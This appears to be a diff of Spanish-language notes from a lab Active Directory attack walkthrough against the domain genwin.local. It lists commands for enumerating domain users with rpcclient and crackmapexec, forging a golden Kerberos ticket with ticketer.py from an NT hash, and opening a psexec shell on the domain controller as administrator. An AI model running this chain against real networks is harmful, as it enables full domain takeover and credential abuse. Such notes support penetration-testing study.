@@ -2,7 +2,7 @@ Como tenemos credenciales de un usuario, vamos a utilizar rpcclient y ver si pod
 
 crackmapexec smb 192.168.56.0/24 -> para saber k IPs hay y cual es el DC.
 
-rpcclient -U "genwin.local\username%password" IP
+rpcclient -U "genwin.local\username%password" IP ->Z IP del DC
     - enumdomusers
     - queryuser rid 
  vemos que un rid tiene una descripcion en la que podemos ver una contraseña de un usuario. Nos conectamos con rdesktop
@@ -122,7 +122,11 @@ ticketer.py -nthash 89f4e1d7cc84000ca05cb5ca1e0478c2 -domain-sid S-1-5-21-191250
 y se nos crea un archivo Administrator.ccache
 
 En terminal:
-export KRB5CCNAME=path/Administrator.ccache
+export KRB5CCNAME=path/Administrator.ccache -> Poner el path del archivo creado.
+
+En /etc/hosts poner lo siguiente:
+    IP_DC genwin.local genwin DC-Company DC-COMPANY
+
 
 psexec.py -n -k genwin.local/administrator@DC-Company cmd.exe
 
